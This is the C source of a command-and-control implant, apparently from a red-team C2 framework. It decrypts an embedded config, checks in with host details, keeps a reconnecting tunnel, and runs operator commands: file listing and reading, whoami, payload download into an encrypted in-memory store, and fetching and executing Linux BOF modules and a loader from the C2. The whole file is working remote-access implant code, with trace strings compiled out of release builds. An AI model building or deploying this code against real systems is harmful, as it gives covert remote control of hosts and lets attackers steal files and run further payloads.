/*
 * agent.c — reference hosted C agent.
 *
 * Ties the protocol layers together into a runnable agent:
 *   embedded config -> crypto backend -> selected transport -> session flow.
 * It checks in with the same host profile the Go agent reports
 * (agentutils.GatherSystemDetails, see sysinfo.c), brings up the message
 * tunnel, runs the filesystem/navigation commands the operator expects
 * (`ls`/`ls_dir` as CBOR []util.Dentry, `stat` as CBOR util.FileStat, `pwd`,
 * `cd`, `cat`) plus the in-memory file commands, and returns output like the
 * Go agent's NotifyC2. It reconnects with fresh check-ins when the C2 drops the
 * tunnel and sends keepalive hellos so the C2's 10-minute handshake timeout
 * never fires. This is the binary the e2e test drives against the real C2.
 *
 * The encrypted CBOR config and the build-wide magic string are rendered at
 * build time by the Go C2 (lib/cagent, compiled via the Makefile's CONFIG_SRC)
 * and linked as ordinary data; embedded_config.h declares the symbols.
 */

#define _POSIX_C_SOURCE 200809L

#include "protocol.h"

#include "bof.h"
#include "embedded_config.h"
#include "gzip.h"
#include "memfile.h"
#include "module.h"
#include "sysinfo.h"

#include "cbor_util.h"

#include "cbor.h"

#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <time.h>
#include <unistd.h>

/* Debug tracing is compiled out unless C2_AGENT_TRACE is defined, so no
 * diagnostic strings ship in the release agent. */
#ifdef C2_AGENT_TRACE
#define TRACE(...)                                                             \
  do {                                                                         \
    fprintf(stderr, __VA_ARGS__);                                              \
    fflush(stderr);                                                            \
  } while (0)
#else
#define TRACE(...)                                                             \
  do {                                                                         \
  } while (0)
#endif

/* Weak defaults overridden by the generated config_embedded.c. An agent
 * built without a config links but cannot decrypt and exits at startup. */
__attribute__((weak)) const uint8_t c2_embedded_config[] = {0};
__attribute__((weak)) const size_t c2_embedded_config_len = 0;
__attribute__((weak)) const uint8_t c2_magic_string[] = {0};
__attribute__((weak)) const size_t c2_magic_string_len = 0;
__attribute__((weak)) const char c2_build_version[] = "N/A";

/* ------------------------------------------------------------------------- */
/* Output buffer + builtin commands */
/* ------------------------------------------------------------------------- */

typedef struct {
  char *p;
  size_t len;
  size_t cap;
} obuf;

static void obuf_append(obuf *b, const char *s, size_t n) {
  if (b->len + n + 1 > b->cap) {
    size_t cap = b->cap ? b->cap * 2 : 256;
    while (cap < b->len + n + 1)
      cap *= 2;
    char *np = (char *)realloc(b->p, cap);
    if (np == NULL)
      return;
    b->p = np;
    b->cap = cap;
  }
  memcpy(b->p + b->len, s, n);
  b->len += n;
  b->p[b->len] = '\0';
}

static void sleep_secs(unsigned secs) {
  struct timespec ts = {(time_t)secs, 0};
  nanosleep(&ts, NULL);
}

static int cmd_eq(c2_str a, const char *b) {
  if (a.len == 0 || a.ptr == NULL)
    return 0;
  size_t bl = strlen(b);
  if (a.len != bl)
    return 0;
  return memcmp(a.ptr, b, bl) == 0;
}

/* util.Dentry / util.FileStat CBOR keys, matching the Go structs the C2
 * decodes (controllers.ParseLSOutput / ParseStatOutput). */
enum {
  DENT_NAME = 1,
  DENT_FTYPE = 2,
  DENT_SIZE = 3,
  DENT_DATE = 4,
  DENT_OWNER = 5,
  DENT_PERM = 6,
};
enum { FSTAT_NAME = 1, FSTAT_PERM = 2, FSTAT_CHECKSUM = 3, FSTAT_SIZE = 4 };

static void mode_string(mode_t m, char out[11]) {
  char type = '-';
  if (S_ISDIR(m))
    type = 'd';
  else if (S_ISLNK(m))
    type = 'L';
  else if (S_ISCHR(m))
    type = 'c';
  else if (S_ISBLK(m))
    type = 'b';
  else if (S_ISFIFO(m))
    type = 'p';
  else if (S_ISSOCK(m))
    type = 'S';
  out[0] = type;
  static const mode_t bits[9] = {0400, 0200, 0100, 0040, 0020,
                                 0010, 0004, 0002, 0001};
  static const char rwx[9] = {'r', 'w', 'x', 'r', 'w', 'x', 'r', 'w', 'x'};
  for (int i = 0; i < 9; i++)
    out[1 + i] = (m & bits[i]) ? rwx[i] : '-';
  if (m & S_ISUID)
    out[3] = (m & 0100) ? 's' : 'S';
  if (m & S_ISGID)
    out[6] = (m & 0010) ? 's' : 'S';
  if (m & 01000)
    out[9] = (m & 0001) ? 't' : 'T';
  out[10] = '\0';
}

static void fmt_date(time_t t, char *out, size_t cap) {
  struct tm tm;
  if (localtime_r(&t, &tm) == NULL ||
      strftime(out, cap, "%Y-%m-%d %H:%M:%S", &tm) == 0)
    snprintf(out, cap, "N/A");
}

static int is_mem_path(const char *p) {
  return strncmp(p, C2_MEMFILE_PREFIX, strlen(C2_MEMFILE_PREFIX)) == 0;
}

/* Append one util.Dentry map to an in-progress CBOR array. */
static c2_status dentry_add(CborEncoder *arr, const char *name,
                            const char *ftype, const char *size,
                            const char *date, const char *perm) {
  CborEncoder map;
  c2_status st = c2_cbor_ec(cbor_encoder_create_map(arr, &map, 5));
  if (st != C2_OK)
    return st;
  if ((st = c2_cbor_write_text(&map, DENT_NAME,
                               c2_str_of(name, strlen(name)))) != C2_OK)
    return st;
  if ((st = c2_cbor_write_text(&map, DENT_FTYPE,
                               c2_str_of(ftype, strlen(ftype)))) != C2_OK)
    return st;
  if ((st = c2_cbor_write_text(&map, DENT_SIZE,
                               c2_str_of(size, strlen(size)))) != C2_OK)
    return st;
  if ((st = c2_cbor_write_text(&map, DENT_DATE,
                               c2_str_of(date, strlen(date)))) != C2_OK)
    return st;
  if ((st = c2_cbor_write_text(&map, DENT_PERM,
                               c2_str_of(perm, strlen(perm)))) != C2_OK)
    return st;
  return c2_cbor_ec(cbor_encoder_close_container(arr, &map));
}

/* `ls [--dst DIR] [DIR]`: CBOR []util.Dentry, exactly like the Go agent's
 * LsPath so the C2's controllers.ParseLSOutput can render it. */
static void run_ls(const c2_memfile *mem, const char *dir, obuf *out) {
  size_t cap = 1u << 20;
  uint8_t *buf = (uint8_t *)malloc(cap);
  if (buf == NULL) {
    obuf_append(out, "ls failed\n", 10);
    return;
  }
  CborEncoder enc;
  cbor_encoder_init(&enc, buf, cap, 0);
  CborEncoder arr;
  c2_status st =
      c2_cbor_ec(cbor_encoder_create_array(&enc, &arr, CborIndefiniteLength));

  if (is_mem_path(dir)) {
    size_t plen = strlen(dir);
    int is_root = (plen == strlen(C2_MEMFILE_PREFIX));
    for (size_t i = 0; st == C2_OK && mem != NULL && i < c2_memfile_count(mem);
         i++) {
      const char *k = c2_memfile_key_at(mem, i);
      if (k == NULL || (!is_root && strncmp(k, dir, plen) != 0))
        continue;
      char sizebuf[48];
      snprintf(sizebuf, sizeof(sizebuf), "%zu bytes",
               c2_memfile_plain_len_at(mem, i));
      st = dentry_add(&arr, k, "file (mem)", sizebuf, "N/A", "-rw-------");
    }
  } else {
    struct stat sb;
    if (stat(dir, &sb) == 0 && !S_ISDIR(sb.st_mode)) {
      const char *base = strrchr(dir, '/');
      base = base ? base + 1 : dir;
      char sizebuf[48], date[64], perm[11];
      snprintf(sizebuf, sizeof(sizebuf), "%lld bytes", (long long)sb.st_size);
      fmt_date(sb.st_mtime, date, sizeof(date));
      mode_string(sb.st_mode, perm);
      st = dentry_add(&arr, base, "file", sizebuf, date, perm);
    } else {
      DIR *d = opendir(dir);
      if (d == NULL) {
        free(buf);
        obuf_append(out, "cannot open directory\n", 22);
        return;
      }
      struct dirent *e;
      while (st == C2_OK && (e = readdir(d)) != NULL) {
        char full[1024];
        if (snprintf(full, sizeof(full), "%s/%s", dir, e->d_name) >=
            (int)sizeof(full))
          continue;
        struct stat es;
        if (stat(full, &es) != 0)
          continue;
        char sizebuf[48], date[64], perm[11];
        snprintf(sizebuf, sizeof(sizebuf), "%lld bytes", (long long)es.st_size);
        fmt_date(es.st_mtime, date, sizeof(date));
        mode_string(es.st_mode, perm);
        st = dentry_add(&arr, e->d_name, S_ISDIR(es.st_mode) ? "dir" : "file",
                        sizebuf, date, perm);
      }
      closedir(d);
    }
  }

  if (st == C2_OK)
    st = c2_cbor_ec(cbor_encoder_close_container(&enc, &arr));
  if (st == C2_OK)
    obuf_append(out, (const char *)buf,
                cbor_encoder_get_buffer_size(&enc, buf));
  else
    obuf_append(out, "ls failed\n", 10);
  free(buf);
}

/* `stat [--dst|--path PATH]`: CBOR util.FileStat. */
static void run_stat(const char *path, obuf *out) {
  struct stat sb;
  if (stat(path, &sb) != 0) {
    obuf_append(out, "Error: cant stat file\n", 24);
    return;
  }
  const char *base = strrchr(path, '/');
  base = base ? base + 1 : path;
  char perm[11];
  mode_string(sb.st_mode, perm);

  uint8_t buf[512];
  CborEncoder enc, map;
  cbor_encoder_init(&enc, buf, sizeof(buf), 0);
  if (c2_cbor_ec(cbor_encoder_create_map(&enc, &map, 4)) != C2_OK) {
    obuf_append(out, "stat failed\n", 12);
    return;
  }
  c2_cbor_write_text(&map, FSTAT_NAME, c2_str_of(base, strlen(base)));
  c2_cbor_write_text(&map, FSTAT_PERM, c2_str_of(perm, strlen(perm)));
  c2_cbor_write_text(&map, FSTAT_CHECKSUM, c2_str_of("N/A", 3));
  c2_cbor_write_int(&map, FSTAT_SIZE, (int64_t)sb.st_size);
  if (c2_cbor_ec(cbor_encoder_close_container(&enc, &map)) != C2_OK) {
    obuf_append(out, "stat failed\n", 12);
    return;
  }
  obuf_append(out, (const char *)buf, cbor_encoder_get_buffer_size(&enc, buf));
}

static void run_cd(const char *path, obuf *out) {
  if (path[0] == '\0' || chdir(path) != 0) {
    obuf_append(out, "cd error\n", 9);
    return;
  }
  char cwd[512];
  if (getcwd(cwd, sizeof(cwd)) != NULL) {
    obuf_append(out, cwd, strlen(cwd));
    obuf_append(out, "\n", 1);
  }
}

static void run_pwd(obuf *out) {
  char cwd[512];
  if (getcwd(cwd, sizeof(cwd)) != NULL) {
    obuf_append(out, "current working directory: ", 27);
    obuf_append(out, cwd, strlen(cwd));
    obuf_append(out, "\n", 1);
  }
}

/* Resolve the path argument of a filesystem command the way the Go agent's
 * cobra flags do: --dst/-d (or --path/-p), else the first positional arg,
 * else `def` (NULL means "empty"). */
static void pick_path(const c2_str_list *cmd, size_t start, const char *def,
                      char *out, size_t cap) {
  out[0] = '\0';
  int have_pos = 0;
  for (size_t i = start; i < cmd->count; i++) {
    c2_str a = cmd->items[i];
    if (a.ptr == NULL || a.len == 0)
      continue;
    char tok[512];
    size_t n = a.len < sizeof(tok) - 1 ? a.len : sizeof(tok) - 1;
    memcpy(tok, a.ptr, n);
    tok[n] = '\0';
    int is_path_flag = strcmp(tok, "--dst") == 0 || strcmp(tok, "-d") == 0 ||
                       strcmp(tok, "--path") == 0 || strcmp(tok, "-p") == 0;
    if (is_path_flag) {
      if (i + 1 < cmd->count) {
        c2_str v = cmd->items[++i];
        size_t vn = v.len < cap - 1 ? v.len : cap - 1;
        memcpy(out, v.ptr, vn);
        out[vn] = '\0';
      }
      continue;
    }
    if (strncmp(tok, "--dst=", 6) == 0 || strncmp(tok, "--path=", 7) == 0 ||
        strncmp(tok, "-d=", 3) == 0 || strncmp(tok, "-p=", 3) == 0) {
      const char *v = strchr(tok, '=') + 1;
      snprintf(out, cap, "%s", v);
      continue;
    }
    if (tok[0] == '-')
      continue; /* unknown flag */
    if (!have_pos) {
      snprintf(out, cap, "%s", tok);
      have_pos = 1;
    }
  }
  if (out[0] == '\0' && def != NULL)
    snprintf(out, cap, "%s", def);
}

/* Append command argument `n` (1-based, after the command name). */
static void argn(const c2_str_list *cmd, size_t n, char *buf, size_t cap) {
  buf[0] = '\0';
  if (cmd->count <= n || cmd->items[n].ptr == NULL)
    return;
  size_t len = cmd->items[n].len;
  if (len >= cap)
    len = cap - 1;
  memcpy(buf, cmd->items[n].ptr, len);
  buf[len] = '\0';
}

static void run_mem_ls(const c2_memfile *mem, obuf *out) {
  for (size_t i = 0; i < c2_memfile_count(mem); i++) {
    const char *k = c2_memfile_key_at(mem, i);
    obuf_append(out, k, strlen(k));
    obuf_append(out, "\n", 1);
  }
}

static void run_mem_read(c2_memfile *mem, const char *key, obuf *out) {
  uint8_t *data = NULL;
  size_t len = 0;
  c2_status st =
      c2_memfile_read_alloc(mem, c2_str_of(key, strlen(key)), &data, &len);
  if (st != C2_OK) {
    obuf_append(out, "read failed\n", 12);
    return;
  }
  obuf_append(out, (const char *)data, len);
  free(data);
}

/* `cat`: a memfs key is read through the cache, anything else off disk. */
static void run_cat(const char *path, obuf *out) {
  FILE *f = fopen(path, "rb");
  if (f == NULL) {
    obuf_append(out, "read failed\n", 12);
    return;
  }
  char buf[4096];
  size_t n;
  while ((n = fread(buf, 1, sizeof(buf), f)) > 0)
    obuf_append(out, buf, n);
  fclose(f);
}

/* `download <name>`: fetch over the www route and cache in memfs (transparent
 * gzip + AES-GCM), mirroring the Go agent's DownloadViaC2 + cacheToMemFS. */
static void run_download(c2_agent_session *s, c2_memfile *mem, const char *name,
                         obuf *out) {
  size_t cap = 16u * 1024u * 1024u;
  uint8_t *buf = (uint8_t *)malloc(cap);
  if (buf == NULL) {
    obuf_append(out, "download failed\n", 16);
    return;
  }
  size_t len = 0;
  c2_status st =
      c2_session_download(s, c2_str_of(name, strlen(name)), buf, cap, &len);
  if (st == C2_OK) {
    char key[512];
    size_t kl = c2_memfile_key(name, strlen(name), key, sizeof(key));
    st =
        kl ? c2_memfile_write(mem, c2_str_of(key, kl), buf, len) : C2_ERR_NOMEM;
  }
  free(buf);
  obuf_append(out, st == C2_OK ? "downloaded\n" : "download failed\n",
              st == C2_OK ? 11 : 16);
}

/* BOF loader dependency name, cached in memfs and fetched from the C2 on the
 * www route as <name>.<arch>.gz when absent (the Linux analogue of the Windows
 * COFFLoader DLL dependency). */
#define C2_BOF_LOADER_KEY "memfs:///coffloader_linux.so"

static const char *c2_arch_name(void) {
  struct utsname un;
  memset(&un, 0, sizeof(un));
  if (uname(&un) != 0)
    return "amd64";
  if (strcmp(un.machine, "x86_64") == 0)
    return "amd64";
  if (strcmp(un.machine, "aarch64") == 0)
    return "arm64";
  if (strcmp(un.machine, "i686") == 0 || strcmp(un.machine, "i386") == 0)
    return "386";
  if (strcmp(un.machine, "riscv64") == 0)
    return "riscv64";
  return "amd64";
}

/* Ensure coffloader_linux.so is in memfs, downloading the hosted .gz if needed.
 */
static c2_status ensure_bof_loader(c2_agent_session *s, c2_memfile *mem) {
  uint8_t *probe = NULL;
  size_t probe_len = 0;
  if (c2_memfile_read_alloc(mem, c2_str_lit(C2_BOF_LOADER_KEY), &probe,
                            &probe_len) == C2_OK) {
    free(probe);
    return C2_OK;
  }

  char name[96];
  snprintf(name, sizeof(name), "coffloader_linux.%s.gz", c2_arch_name());
  size_t gz_cap = 8u * 1024u * 1024u;
  uint8_t *gz = (uint8_t *)malloc(gz_cap);
  if (gz == NULL)
    return C2_ERR_NOMEM;
  size_t gz_len = 0;
  c2_status st = c2_session_download(s, c2_str_of(name, strlen(name)), gz,
                                     gz_cap, &gz_len);
  if (st != C2_OK) {
    free(gz);
    return st;
  }

  size_t so_cap = 16u * 1024u * 1024u;
  uint8_t *so = (uint8_t *)malloc(so_cap);
  if (so == NULL) {
    free(gz);
    return C2_ERR_NOMEM;
  }
  size_t so_len = 0;
  st = c2_gzip_decompress(gz, gz_len, so, so_cap, &so_len);
  free(gz);
  if (st == C2_OK)
    st = c2_memfile_write(mem, c2_str_lit(C2_BOF_LOADER_KEY), so, so_len);
  free(so);
  return st;
}

/* `bof <object> [export] [args...]`: run a Linux relocatable BOF through the
 * coffloader_linux dependency. Args are prefixed tokens (i/s/z/Z/b); when the
 * first optional token starts with such a prefix it is an argument and the
 * export defaults to "go". */
/* Value of `--name value` or `--name=value` from the command slice, or "". */
static void pick_flag(const c2_str_list *cmd, const char *name, char *out,
                      size_t cap) {
  out[0] = '\0';
  size_t nlen = strlen(name);
  for (size_t i = 0; i < cmd->count; i++) {
    c2_str a = cmd->items[i];
    if (a.ptr == NULL || a.len == 0)
      continue;
    if (a.len > nlen && memcmp(a.ptr, name, nlen) == 0 && a.ptr[nlen] == '=') {
      size_t vn = a.len - nlen - 1;
      if (vn >= cap)
        vn = cap - 1;
      memcpy(out, a.ptr + nlen + 1, vn);
      out[vn] = '\0';
      return;
    }
    if (a.len == nlen && memcmp(a.ptr, name, nlen) == 0) {
      if (i + 1 < cmd->count) {
        c2_str v = cmd->items[++i];
        size_t vn = v.len < cap - 1 ? v.len : cap - 1;
        memcpy(out, v.ptr, vn);
        out[vn] = '\0';
      }
      return;
    }
  }
}

/* Run one BOF object already in memory through the coffloader_linux
 * dependency. `tokens` are the packed-arg tokens c2_bof_pack_args consumes. */
static void execute_bof(c2_agent_session *s, c2_memfile *mem,
                        const uint8_t *bof, size_t bof_len,
                        const char *export_name, const c2_str *tokens,
                        size_t tokenc, obuf *out) {
  if (ensure_bof_loader(s, mem) != C2_OK) {
    obuf_append(out, "bof: coffloader_linux unavailable\n", 31);
    return;
  }
  uint8_t *loader = NULL;
  size_t loader_len = 0;
  if (c2_memfile_read_alloc(mem, c2_str_lit(C2_BOF_LOADER_KEY), &loader,
                            &loader_len) != C2_OK) {
    obuf_append(out, "bof: coffloader_linux unavailable\n", 31);
    return;
  }

  size_t packed_cap = 4;
  for (size_t i = 0; i < tokenc; i++)
    packed_cap += 8 + tokens[i].len * 4;
  uint8_t *packed = (uint8_t *)malloc(packed_cap);
  size_t packed_len = 0;
  char *result = NULL;
  c2_status st = C2_OK;
  if (packed == NULL) {
    st = C2_ERR_NOMEM;
  } else if (tokenc > 0) {
    st = c2_bof_pack_args(tokens, tokenc, packed, packed_cap, &packed_len);
  }
  if (st == C2_OK)
    st =
        c2_bof_run(loader, loader_len, bof, bof_len,
                   (export_name != NULL && export_name[0]) ? export_name : "go",
                   packed, packed_len, &result);
  if (st == C2_OK && result != NULL) {
    obuf_append(out, result, strlen(result));
    free(result);
  } else if (result != NULL) {
    obuf_append(out, "bof: ", 5);
    obuf_append(out, result, strlen(result));
    obuf_append(out, "\n", 1);
    free(result);
  } else if (st != C2_OK) {
    obuf_append(out, "bof: run failed\n", 16);
  }
  free(packed);
  free(loader);
}

/* `bof <object> [export] [args...]`: run a relocatable object already in
 * memfs. */
static void run_bof(c2_agent_session *s, c2_memfile *mem,
                    const c2_str_list *cmd, obuf *out) {
  char object[512];
  argn(cmd, 1, object, sizeof(object));
  if (!object[0]) {
    obuf_append(out, "bof: missing object\n", 20);
    return;
  }

  char export_name[64] = "go";
  size_t arg_start = 2;
  if (cmd->count > 2 && cmd->items[2].len > 0) {
    char c0 = cmd->items[2].ptr[0];
    if (c0 != 'i' && c0 != 's' && c0 != 'z' && c0 != 'Z' && c0 != 'b') {
      size_t n = cmd->items[2].len;
      if (n >= sizeof(export_name))
        n = sizeof(export_name) - 1;
      memcpy(export_name, cmd->items[2].ptr, n);
      export_name[n] = '\0';
      arg_start = 3;
    }
  }

  char key[512];
  size_t key_len = c2_memfile_key(object, strlen(object), key, sizeof(key));
  uint8_t *bof = NULL;
  size_t bof_len = 0;
  if (key_len == 0 || c2_memfile_read_alloc(mem, c2_str_of(key, key_len), &bof,
                                            &bof_len) != C2_OK) {
    obuf_append(out, "bof: object not found\n", 22);
    return;
  }
  execute_bof(s, mem, bof, bof_len, export_name, &cmd->items[arg_start],
              cmd->count - arg_start, out);
  free(bof);
}

/* `!custom_module --mod_name X --type coff --file_to_download Y.gz
 *  --checksum <sha256> --invocation <base64 CBOR>`: the C2's module dispatch.
 * Download + verify + decompress the payload, decode the invocation, run the
 * BOF. This is the path the operator's `hello_linux` (and any Linux BOF module)
 * takes, mirroring the Go agent's ModuleHandler for `coff`. */
static void run_custom_module(c2_agent_session *s, c2_memfile *mem,
                              const c2_str_list *cmd, obuf *out) {
  char mod_name[128] = "";
  char type[32] = "";
  char file[512] = "";
  char checksum[128] = "";
  pick_flag(cmd, "--mod_name", mod_name, sizeof(mod_name));
  pick_flag(cmd, "--type", type, sizeof(type));
  pick_flag(cmd, "--file_to_download", file, sizeof(file));
  pick_flag(cmd, "--checksum", checksum, sizeof(checksum));

  size_t inv_cap = 256u * 1024u;
  char *invocation = (char *)malloc(inv_cap);
  if (invocation == NULL) {
    obuf_append(out, "custom_module: out of memory\n", 28);
    return;
  }
  pick_flag(cmd, "--invocation", invocation, inv_cap);

  if (!c2_str_eq_ci(type, "coff")) {
    obuf_append(out, "custom_module: unsupported module type\n", 37);
    free(invocation);
    return;
  }
  if (file[0] == '\0' || invocation[0] == '\0') {
    obuf_append(out, "custom_module: missing args\n", 27);
    free(invocation);
    return;
  }

  size_t gz_cap = 32u * 1024u * 1024u;
  uint8_t *gz = (uint8_t *)malloc(gz_cap);
  if (gz == NULL) {
    obuf_append(out, "custom_module: out of memory\n", 28);
    free(invocation);
    return;
  }
  size_t gz_len = 0;
  c2_status st = c2_session_download(s, c2_str_of(file, strlen(file)), gz,
                                     gz_cap, &gz_len);
  if (st != C2_OK) {
    TRACE("[agent] custom_module: download %s failed: %d\n", file, st);
    obuf_append(out, "custom_module: download failed\n", 30);
    free(gz);
    free(invocation);
    return;
  }

  if (checksum[0] != '\0') {
    uint8_t digest[C2_SHA256_BYTES];
    if (s->be->sha256 == NULL ||
        s->be->sha256(s->be->ctx, gz, gz_len, digest) != 0) {
      obuf_append(out, "custom_module: checksum unavailable\n", 35);
      free(gz);
      free(invocation);
      return;
    }
    char hex[C2_SHA256_BYTES * 2 + 1];
    c2_hex_encode(digest, sizeof(digest), hex);
    hex[C2_SHA256_BYTES * 2] = '\0';
    if (!c2_str_eq_ci(hex, checksum)) {
      obuf_append(out, "custom_module: checksum mismatch\n", 32);
      free(gz);
      free(invocation);
      return;
    }
  }

  size_t obj_cap = 16u * 1024u * 1024u;
  uint8_t *obj = (uint8_t *)malloc(obj_cap);
  if (obj == NULL) {
    obuf_append(out, "custom_module: out of memory\n", 28);
    free(gz);
    free(invocation);
    return;
  }
  size_t obj_len = 0;
  st = c2_gzip_decompress(gz, gz_len, obj, obj_cap, &obj_len);
  free(gz);
  if (st != C2_OK) {
    obuf_append(out, "custom_module: decompress failed\n", 32);
    free(obj);
    free(invocation);
    return;
  }

  size_t tokbuf_cap = 256u * 1024u;
  char *tokbuf = (char *)malloc(tokbuf_cap);
  if (tokbuf == NULL) {
    obuf_append(out, "custom_module: out of memory\n", 28);
    free(obj);
    free(invocation);
    return;
  }
  char export_name[64] = "go";
  c2_str tokens[64];
  size_t tokenc = 0;
  size_t tokbuf_used = 0;
  st = c2_coff_invocation_parse(invocation, strlen(invocation), export_name,
                                sizeof(export_name), tokens, &tokenc,
                                sizeof(tokens) / sizeof(tokens[0]), tokbuf,
                                tokbuf_cap, &tokbuf_used);
  free(invocation);
  if (st != C2_OK) {
    obuf_append(out, "custom_module: bad invocation\n", 29);
    free(tokbuf);
    free(obj);
    return;
  }

  TRACE("[agent] custom_module %s: %zu args export=%s\n", mod_name, tokenc,
        export_name);
  execute_bof(s, mem, obj, obj_len, export_name, tokens, tokenc, out);
  free(tokbuf);
  free(obj);
}

static void dispatch(const c2_msgtun *m, c2_agent_session *s, c2_memfile *mem,
                     obuf *out) {
  if (m->cmd_slice.count == 0)
    return;

  /* Command names may arrive C2-prefixed ("!stat", "!ls_dir"); strip the '!'
   * so one handler covers both the core and C2 spellings. */
  c2_str name = m->cmd_slice.items[0];
  if (name.ptr != NULL && name.len > 0 && name.ptr[0] == '!') {
    name.ptr++;
    name.len--;
  }

  char arg[512], arg2[512];
  argn(&m->cmd_slice, 1, arg, sizeof(arg));
  argn(&m->cmd_slice, 2, arg2, sizeof(arg2));

  if (cmd_eq(name, "ls") || cmd_eq(name, "ls_dir")) {
    pick_path(&m->cmd_slice, 1, ".", arg, sizeof(arg));
    run_ls(mem, arg, out);
  } else if (cmd_eq(name, "pwd")) {
    run_pwd(out);
  } else if (cmd_eq(name, "cd")) {
    pick_path(&m->cmd_slice, 1, NULL, arg, sizeof(arg));
    run_cd(arg, out);
  } else if (cmd_eq(name, "stat")) {
    pick_path(&m->cmd_slice, 1, ".", arg, sizeof(arg));
    run_stat(arg, out);
  } else if (cmd_eq(name, "whoami")) {
    const char *u = getenv("USER");
    if (u != NULL) {
      obuf_append(out, u, strlen(u));
      obuf_append(out, "\n", 1);
    }
  } else if (cmd_eq(name, "mem_write")) {
    char key[512];
    size_t kl = c2_memfile_key(arg, strlen(arg), key, sizeof(key));
    if (kl == 0) {
      obuf_append(out, "invalid key\n", 12);
    } else {
      c2_status st = c2_memfile_write(mem, c2_str_of(key, kl),
                                      (const uint8_t *)arg2, strlen(arg2));
      if (st == C2_OK)
        obuf_append(out, "ok\n", 3);
      else
        obuf_append(out, "write failed\n", 13);
    }
  } else if (cmd_eq(name, "mem_read")) {
    char key[512];
    size_t kl = c2_memfile_key(arg, strlen(arg), key, sizeof(key));
    if (kl == 0)
      obuf_append(out, "invalid key\n", 12);
    else
      run_mem_read(mem, key, out);
  } else if (cmd_eq(name, "cat")) {
    pick_path(&m->cmd_slice, 1, NULL, arg, sizeof(arg));
    if (is_mem_path(arg))
      run_mem_read(mem, arg, out);
    else
      run_cat(arg, out);
  } else if (cmd_eq(name, "mem_ls")) {
    run_mem_ls(mem, out);
  } else if (cmd_eq(name, "download")) {
    run_download(s, mem, arg, out);
  } else if (cmd_eq(name, "custom_module")) {
    run_custom_module(s, mem, &m->cmd_slice, out);
  } else if (cmd_eq(name, "bof")) {
    run_bof(s, mem, &m->cmd_slice, out);
  } else {
    obuf_append(out, "unsupported command\n", 20);
  }
}

/* ------------------------------------------------------------------------- */
/* main */
/* ------------------------------------------------------------------------- */

/* Exported so a shared-object build (and malasada's raw PIC) can resolve the
 * entry from .dynsym; the agent is built with -fvisibility=hidden, which would
 * otherwise drop it. Harmless for the executable. */
__attribute__((visibility("default"))) int main(void) {
  TRACE("[agent] start\n");
  c2_crypto_backend *be = c2_crypto_open();
  if (be == NULL) {
    TRACE("[agent] no crypto backend\n");
    return 1;
  }

  uint8_t plain[16384];
  size_t plain_len = 0;
  c2_str magic = c2_str_of((const char *)c2_magic_string, c2_magic_string_len);
  c2_status st =
      c2_config_decrypt(be, magic, c2_embedded_config, c2_embedded_config_len,
                        plain, sizeof(plain), &plain_len);
  if (st != C2_OK) {
    TRACE("[agent] config decrypt failed: %d\n", st);
    return 1;
  }
  TRACE("[agent] config decrypted: %zu bytes\n", plain_len);

  c2_agent_config cfg;
  memset(&cfg, 0, sizeof(cfg));
  CborParser parser;
  CborValue it;
  if (cbor_parser_init(plain, plain_len, 0, &parser, &it) != CborNoError) {
    TRACE("[agent] cbor init failed\n");
    return 1;
  }
  if ((st = c2_agent_config_decode(&it, &cfg)) != C2_OK) {
    TRACE("[agent] config decode failed: %d\n", st);
    return 1;
  }
  cfg.magic_string = magic;
  TRACE("[agent] cfg host=%.*s http_port=%.*s mode=%.*s\n",
        (int)cfg.cc_address.len, cfg.cc_address.ptr, (int)cfg.cc_http_port.len,
        cfg.cc_http_port.ptr, (int)cfg.c2_channel_mode.len,
        cfg.c2_channel_mode.ptr);

  c2_transport transport = c2_transport_create(&cfg);
  c2_agent_session s;
  if ((st = c2_session_init(&s, be, transport, &cfg, NULL)) != C2_OK) {
    TRACE("[agent] session init failed: %d\n", st);
    return 1;
  }
  TRACE("[agent] session init ok\n");

  /* In-memory file cache (memfs): entries are gzip-compressed and
   * AES-GCM-encrypted with the build config's file password. */
  c2_memfile mem;
  c2_memfile_init(&mem, be, cfg.password, C2_MEMFILE_DEFAULT_MAX_BYTES);

  /* Host facts for the check-in body, mirroring the Go agent's
   * GatherSystemDetails (identity, OS/arch/kernel, user, process, uptime,
   * IPs, memfs listing, transport label). */
  c2_agent_info info;
  c2_sysinfo_store sysinfo;
  if ((st = c2_gather_agent_info(&info, &cfg, &mem, c2_build_version,
                                 &sysinfo)) != C2_OK) {
    TRACE("[agent] gather info failed: %d\n", st);
    return 1;
  }

  /* Keep the agent alive across C2 restarts, network drops and tunnel
   * teardown: check in, bring up the message tunnel, run jobs, and reconnect
   * when the tunnel closes (the Go agent behaves the same way). */
  for (;;) {
    if ((st = c2_session_checkin(&s, &info)) != C2_OK) {
      TRACE("[agent] checkin failed: %d\n", st);
      sleep_secs(5);
      continue;
    }
    TRACE("[agent] checkin ok\n");

    c2_str msg_caps_items[1] = {cfg.routes.msg};
    c2_str_list msg_caps = {msg_caps_items, 1, 1};
    c2_secureconn msg;
    if ((st = c2_session_open_route(&s, cfg.routes.msg, c2_str_lit(""),
                                    &msg_caps, &msg)) != C2_OK) {
      TRACE("[agent] msg route open failed: %d\n", st);
      sleep_secs(5);
      continue;
    }
    if ((st = c2_session_hello(&s, &msg, 1)) != C2_OK) {
      TRACE("[agent] hello failed: %d\n", st);
      c2_secureconn_close(&msg);
      sleep_secs(5);
      continue;
    }
    TRACE("[agent] hello sent\n");

    for (;;) {
      c2_msgtun m;
      memset(&m, 0, sizeof(m));
      int is_job = 0;
      if ((st = c2_session_read(&s, &msg, &m, &is_job)) != C2_OK) {
        if (st == C2_ERR_TIMEOUT) {
          /* Idle long-poll. The C2 drops a tunnel that is silent for 10
           * minutes, so answer with a keepalive hello (no ECDH). */
          TRACE("[agent] idle, keepalive\n");
          (void)c2_session_hello(&s, &msg, 0);
          continue;
        }
        TRACE("[agent] read failed: %d\n", st);
        break;
      }
      if (!is_job)
        continue;
      TRACE("[agent] job received\n");

      obuf out = {0};
      dispatch(&m, &s, &mem, &out);
      (void)c2_session_send_result(&s, &msg, m.job_id, &m.cmd_slice,
                                   (const uint8_t *)out.p, out.len);
      free(out.p);
    }

    c2_secureconn_close(&msg);
    TRACE("[agent] tunnel closed, reconnecting\n");
    sleep_secs(1);
  }
}
